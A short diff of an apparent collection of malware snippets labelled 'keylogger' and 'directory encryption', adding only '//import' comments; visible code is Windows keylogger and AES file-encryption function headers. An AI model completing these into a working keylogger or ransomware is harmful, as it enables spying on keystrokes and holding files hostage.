@@ -2,7 +2,7 @@ keylogger:
 ```
 #include <stdio.h>
 #include <windows.h>
-
+//import
 int klog() {
     char key;
     while(1) {
@@ -27,6 +27,7 @@ directory encryption:
 #include <string.h>
 #include <dirent.h>
 #include <openssl/evp.h>
+//import
 
 // Function to encrypt a file using AES-256-CBC encryption
 void encryptFile(char* fileName, char* key) {
